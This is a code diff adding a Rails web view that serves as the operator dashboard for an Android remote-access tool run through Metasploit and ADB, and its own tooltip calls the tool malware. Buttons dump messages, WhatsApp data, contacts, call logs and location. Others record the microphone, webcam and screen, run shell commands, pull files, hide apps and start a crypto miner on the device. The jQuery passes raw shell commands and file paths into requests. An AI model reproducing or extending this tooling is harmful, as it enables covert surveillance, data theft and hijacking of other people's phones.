@@ -1,0 +1,266 @@
+<%= stylesheet_link_tag 'smartphones2', media: 'all', 'data-turbolinks-track': 'reload' %>
+<%= stylesheet_link_tag 'smartphones', media: 'all', 'data-turbolinks-track': 'reload' %>
+<%= javascript_pack_tag 'smartphones', 'data-turbolinks-track': 'reload' %>
+<%= stylesheet_link_tag 'arrow_buttons', media: 'all', 'data-turbolinks-track': 'reload' %>
+<%= stylesheet_link_tag 'status', media: 'all', 'data-turbolinks-track': 'reload' %>
+<%= stylesheet_link_tag 'tooltip', media: 'all', 'data-turbolinks-track': 'reload' %>
+
+<span class="arrow_container_left">
+    <span class="device_info">
+        <span id="ip_address"></span>
+        <span id="operating_system"></span>
+        <span id="is_rooted"></span>
+    </span>
+    <a class="arrow_button" href="#">
+        <span class="left"></span>
+    </a>
+</span>
+
+<div class="smartphonee">
+    <div class="volume-btnn"></div>
+    <div class="app-wrapperr">
+        <div class="topp-0">
+            <div class="cameraa"></div><div class="speakerr"></div><div class="cameraa hidee"></div>
+        </div>
+        <div class="topp"></div>
+        <div class="screenn">
+            <div class="screen-toolbar">
+                <span class="left-toolbar-items">
+                <span id="local_hour"></span>
+                </span>
+                <span class="right-toolbar-items">
+                    <span id="battery_level"></span>
+                    <svg class="battery-icon" version="1.1" id="Capa_1" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" x="0px" y="0px" viewBox="0 0 569.16 569.16" style="enable-background:new 0 0 569.16 569.16;"xml:space="preserve"><g><g><path d="M471.108,96.392H36.27c-20,0-36.27,16.227-36.27,36.172v304.033c0,19.945,16.27,36.172,36.27,36.172h434.838 c20,0,36.273-16.227,36.273-36.172V132.564C507.382,112.619,491.108,96.392,471.108,96.392z M217.26,422.065 c0,11.459-9.315,20.746-20.802,20.746H53.544c-11.49,0-20.802-9.291-20.802-20.746v-274.97c0-11.459,9.314-20.747,20.802-20.747 h142.914c11.49,0,20.802,9.29,20.802,20.747V422.065L217.26,422.065z"/><path d="M532.89,174.893c0,0-1.609,0-3.592,0c-1.983,0-3.593,2.727-3.593,6.086v207.199c0,3.361,1.606,6.086,3.593,6.086h3.592 c20,0,36.271-16.227,36.271-36.172V211.065C569.16,191.12,552.89,174.893,532.89,174.893z"/></g></g><g></g><g></g><g></g><g></g><g></g><g></g><g></g><g></g><g></g><g></g><g></g><g></g><g></g><g></g><g></g></svg>
+                </span>
+                </div>
+            <div class="top-icons">
+                <div class="app_row">
+                    <%= render "dump_sysinfo_app_icon", :smartphone => smartphone %>
+                    <%= render "dump_location_app_icon", :smartphone => smartphone %>
+                    <%= render "video_rec_app_icon", :smartphone => smartphone %>
+                    <%= render "dump_messages_app_icon", :smartphone => smartphone %>
+                </div>
+                <div class="app_names">
+                    <span class="app_name">System Info</span>
+                    <span class="app_name">Dump Location</span>
+                    <span class="app_name">Webcam Stream</span>
+                    <span class="app_name">Dump Messages</span>
+                </div>
+                <div class="app_row">
+                    <%= render "whatsapp_app_icon", :smartphone => smartphone %>
+                    <%= render "audio_mode_app_icon", :smartphone => smartphone %>
+                    <%= render "dump_wifi_app_icon", :smartphone => smartphone %>
+                    <%= render "call_logs_app_icon", :smartphone => smartphone %>
+                </div>
+                <div class="app_names">
+                    <span class="app_name">WhatsApp Data</span>
+                    <span class="app_name">Audio Mode</span>
+                    <span class="app_name">Wi-Fi Information</span>
+                    <span class="app_name">Dump Call Log</span>
+                </div>
+                <div class="app_row">
+                    <%= render "dump_localtime_app_icon", :smartphone => smartphone %>
+                    <%= render "microphone_rec_app_icon", :smartphone => smartphone %>
+                    <%= render "uninstall_app_app_icon", :smartphone => smartphone %>
+                    <%= render "list_apps_app_icon", :smartphone => smartphone %>
+                </div>
+                <div class="app_names">
+                    <span class="app_name">Dump Localtime</span>
+                    <span class="app_name">Microphone REC</span>
+                    <span class="app_name">Uninstall App</span>
+                    <span class="app_name">Installed Apps</span>
+                </div>
+                <div class="app_row">
+                    <%= render "screen_snap_app_icon", :smartphone => smartphone %>
+                    <%= render "send_message_app_icon", :smartphone => smartphone %>
+                    <%= render "upload_file_app_icon", :smartphone => smartphone %>
+                    <%= render "dump_contacts_app_icon", :smartphone => smartphone %>
+                </div>
+                <div class="app_names">
+                    <span class="app_name">Screen Snap</span>
+                    <span class="app_name">Send Message</span>
+                    <span class="app_name">Upload File</span>
+                    <span class="app_name">Dump Contacts</span>
+                </div>
+                <div class="app_row">
+                    <%= render "lock_screen_app_icon", :smartphone => smartphone %>
+                    <%= render "screen_record_app_icon", :smartphone => smartphone %>
+                    <%= render "shell_command_app_icon", :smartphone => smartphone %>
+                    <%= render "webcam_snap_app_icon", :smartphone => smartphone %>                
+                </div>
+                <div class="app_names">
+                    <span class="app_name">Unlock Screen</span>
+                    <span class="app_name">Screen Record</span>
+                    <span class="app_name">Shell Command</span>
+                    <span class="app_name">Webcam Snap</span>
+                </div>
+                <div class="app_row">
+                    <%= render "run_app_app_icon", :smartphone => smartphone %>
+                    <%= render "install_app_app_icon", :smartphone => smartphone %>
+                    <%= render "dump_device_info_app_icon", :smartphone => smartphone %>
+                    <%= render "pull_file_app_icon", :smartphone => smartphone %>                
+                </div>
+                <div class="app_names">
+                    <span class="app_name">Open Application</span>
+                    <span class="app_name">Install APK</span>
+                    <span class="app_name">Device Info</span>
+                    <span class="app_name">Pull File</span>
+                </div>
+                <div class="app_row">
+                    <%= render "hide_app_app_icon", :smartphone => smartphone %>
+                    <%= render "show_app_app_icon", :smartphone => smartphone %>
+                    <%= render "crypto_minner_app_icon", :smartphone => smartphone %>                
+                </div>
+                <div class="app_names">
+                    <span class="app_name">Hide App</span>
+                    <span class="app_name">Show App</span>
+                    <span class="app_name">Crypto Minner</span>
+                </div>
+            </div>
+            <div class="timee">
+                <div id="ctt"></div>
+                <div id="cdd"></div>
+            </div>
+        </div>
+        <div class="bottomm">
+            <div class="touch-buttonn"></div>
+        </div>
+    </div>
+</div>
+<span class="arrow_container_right">
+    <span class="demos">
+        <span tooltip="A green MSF box means the malware is installed and running on the device.
+
+        A red box means the malware is not running on the device. Make sure you have installed the APK and is opened." flow="up">
+            <span class="demo">
+                <span class="msf_status server-status" type="down"></span>
+                <span class="service_status service_status_msf">MSF</span>
+            </span>
+        </span>
+        <span tooltip="A green ADB box means the device target specified in the configuration (either USB or IP) is connected through ADB.
+
+        A red box means the device is not connected through ADB. Make sure:
+        - the correct IP (if USB is not selected) is specified in the configuration.
+        - USB debugging is enabled on the device
+        - try to unplug the usb and restart" flow="down">
+            <span class="demo">
+                <span class="adb_status server-status" type="down"></span>
+                <span class="service_status service_status_adb">ADB</span>
+            </span>
+        </span>
+    </span>
+
+    <a class="arrow_button" href="#">
+        <span class="right"></span>
+    </a>
+</span>
+
+  
+
+<script>
+    $(function() {
+        $(document).ready(function() {
+            setInterval(function() {
+                jQuery.ajax({
+                    url: "../smartphones/check_connection",
+                    type: "GET",
+                    dataType: "script"
+                });
+            }, 6000);
+        });
+    });
+
+  
+
+
+    
+  $(".msf_link,.adb_link,.adb_msf_link").click(function() {
+    $(this).attr("href", function() {
+      return this.href
+        + "&open=" + $("#open_toggle")[0].checked
+        + "&download=" + $("#download_toggle")[0].checked
+        + "&exec_timeout=" + $("#exec_timeout_slider")[0].value
+        + "&copy_timeout=" + $("#cp_timeout_slider")[0].value;
+    });
+  });
+
+  $("#webcam_snap_link, #webcam_record_link").click(function() {
+    $(this).attr("href", function() {
+      return this.href + "&back_camera=" + $("#back_camera_input")[0].checked
+                       + "&quality=" + $("#slider_quality")[0].value;
+    });
+  });
+
+  $("#microphone_rec_link, #screen_record_link").click(function() {
+    $(this).attr("href", function() {
+      return this.href + "&time=" + $("#slider_time")[0].value;
+    });
+  });
+
+  $("#dump_whatsapp_data_link,#dump_screen_snap_link,#dump_messages_link,#dump_contacts_link,#dump_callogs_link,#microphone_rec_link,#webcam_record_link,#webcam_snap_link,#screen_record_link").click(function() {
+    $(this).attr("href", function() {
+      return this.href + "&filename=" + $("#input_box_filename").val()
+                       + "&filepath=" + $("#input_box_filepath").val();
+    });
+  });
+
+  $("#send_sms_link").click(function() {
+    $(this).attr("href", function() {
+      return this.href + "&destination=" + $("#input_box_destination").val()
+                       + "&content=" + $("#input_box_content").val();
+
+    });
+  });
+
+  $("#pull_file_link").click(function() {
+    $(this).attr("href", function() {
+      return this.href + "&pull_file=" + $("#input_box_pull_file").val()
+                       + "&destination=" + $("#input_box_pull_file_destination").val();
+
+    });
+  });
+
+  $("#upload_file_link").click(function() {
+    $(this).attr("href", function() {
+      return this.href + "&push_file=" + $("#input_box_push_file").val()
+                       + "&destination=" + $("#input_box_push_file_destination").val();
+
+    });
+  });
+
+  $("#shell_command_link").click(function() {
+    $(this).attr("href", function() {
+      return this.href + "&command=" + $("#input_box_shell_command").val();
+
+    });
+  });
+
+  $("#uninstall_app_link").click(function() {
+    $(this).attr("href", function() {
+      return this.href + "&app=" + $("#input_box_application").val();
+
+    });
+  });
+
+  $("#install_apk_link,#open_app_link").click(function() {
+    $(this).attr("href", function() {
+      return this.href + "&app=" + $("#input_box_apkpath").val();
+
+    });
+  });
+
+  $("#install_apk_link").click(function() {
+    $(this).attr("href", function() {
+      return this.href + "&app=" + $("#input_box_apkpath").val();
+
+    });
+  });
+
+  $("#list_apps_link").click(function() {
+    $(this).attr("href", function() {
+      return this.href + "&system_apps=" + $("#system_apps_toggle")[0].checked
+                       + "&user_apps=" + $("#user_apps_toggle")[0].checked;
+
+    });
+  });
+</script>
